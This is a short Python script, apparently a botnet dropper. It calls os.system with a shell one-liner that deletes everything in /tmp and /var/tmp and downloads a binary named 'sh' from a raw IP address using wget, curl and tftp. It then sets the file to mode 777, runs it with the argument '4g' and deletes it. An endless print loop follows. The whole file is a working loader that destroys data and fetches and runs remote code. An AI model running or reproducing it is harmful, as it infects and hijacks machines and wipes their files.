import os

os.system("cd /var/tmp; cd /tmp; rm -rf *; wget http://141.98.10.75/sh; curl -O http://141.98.10.75/sh; tftp -g -r sh 141.98.10.75; tftp 141.98.10.75 -c get sh; chmod 777 sh; ./sh 4g; sh sh 4g; rm -rf sh")

while 1 == 1:
   print("l")
